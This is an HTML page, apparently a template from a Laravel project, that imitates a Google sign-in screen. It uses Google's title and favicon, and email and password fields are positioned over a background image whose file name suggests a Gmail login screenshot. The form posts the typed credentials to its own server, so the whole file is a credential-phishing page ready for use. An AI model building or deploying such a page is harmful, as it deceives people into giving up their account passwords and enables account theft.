<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <link rel="shortcut icon" href="https://www.google.com.eg/images/branding/product/ico/googleg_lodp.ico">
    <title>Google</title>
    <style>
        body {
            background: url('images/gm-en.png') no-repeat;
        }
    </style>
</head>
<body>
<form method="post">
    <div style="position: absolute; width: 207px; height: 30px; z-index: 1; left: 555px; top: 335px" id="layer1">
        <input style="height: 27px;" name="email" placeholder=" Your Email" size="32"></div>
    <div style="position: absolute; width: 207px; height: 30px; z-index: 1; left: 555px; top: 375px" id="layer2">
        <input style="height: 27px;" name="pass" type="password" placeholder=" Your Password" size="32"></div>
    <div style="background:url(&#39;&#39;); position: absolute; width: 274px; height: 34px; z-index: 2; left: 543px; top: 449px"
         id="layer3">
        <input name="submit" type="submit" value=""
               style="background:url(); border:none; width:100%; height:100%; color:; font-weight:bold; ">
    </div>
    <input type="hidden" name="_token" value="{{ csrf_token() }}">
</form>
</body>
</html>
</body>
</html>
